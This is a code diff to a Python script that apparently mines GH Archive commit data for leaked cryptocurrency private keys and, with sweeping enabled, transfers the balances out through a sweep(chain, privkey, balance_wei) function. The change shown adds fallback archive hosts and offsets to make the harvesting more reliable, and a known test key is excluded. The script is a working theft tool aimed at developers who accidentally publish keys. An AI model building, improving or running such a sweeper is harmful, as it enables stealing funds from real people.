@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-dot
+DOT
 
 """
 
@@ -51,12 +51,17 @@ CHAINS = {
 }
 
 SWEEP_ENABLED = True
-ARCHIVE_HOURS = 2
 MAX_COMMITS_PER_RUN = 350
 MAX_ADDRESSES_PER_RUN = 300
 FETCH_WORKERS = 10
 CHECK_WORKERS = 6
 RUN_BUDGET_SEC = 780
+
+ARCHIVE_HOSTS = [
+    "https://gharchive.open-digger.net/",
+    "https://data.gharchive.org/",
+]
+ARCHIVE_OFFSETS = (2, 3)
 
 TEST_KEYS = {
     "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
@@ -254,21 +259,28 @@ def sweep(chain, privkey, balance_wei):
 # ---------------- SOURCE 1: GH ARCHIVE ----------------
 def collect_archive(seen_shas):
     commits = []
-    now = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(hours=1)
-    for i in range(ARCHIVE_HOURS):
+    now = datetime.datetime.now(datetime.timezone.utc)
+
+    for off in ARCHIVE_OFFSETS:
         if out_of_time() or len(commits) >= MAX_COMMITS_PER_RUN:
             break
-        t = now - datetime.timedelta(hours=i)
+        t = now - datetime.timedelta(hours=off)
         name = "%d-%d-%d-%d" % (t.year, t.month, t.day, t.hour)
-        url = "https://data.gharchive.org/" + name + ".json.gz"
-        try:
-            r = requests.get(url, timeout=150)
-            if r.status_code != 200:
-                log("[a] %s -> %d" % (name, r.status_code))
-                continue
-            raw = gzip.decompress(r.content).decode("utf-8", "ignore")
-        except Exception as exc:
-            log("[a] %s failed: %s" % (name, str(exc)[:60]))
+
+        raw = None
+        for host in ARCHIVE_HOSTS:
+            tag = host.split("/")[2]
+            try:
+                r = requests.get(host + name + ".json.gz", timeout=180)
+                if r.status_code == 200 and len(r.content) > 2000:
+                    raw = gzip.decompress(r.content).decode("utf-8", "ignore")
+                    log("[a] %s ok via %s" % (name, tag))
+                    break
+                log("[a] %s %s -> %d" % (name, tag, r.status_code))
+            except Exception as exc:
+                log("[a] %s %s failed: %s" % (name, tag, str(exc)[:50]))
+
+        if raw is None:
             continue
 
         got = 0
@@ -290,6 +302,7 @@ def collect_archive(seen_shas):
             if len(commits) >= MAX_COMMITS_PER_RUN:
                 break
         log("[a] %s: %d commits (total %d)" % (name, got, len(commits)))
+
     return commits
 
 
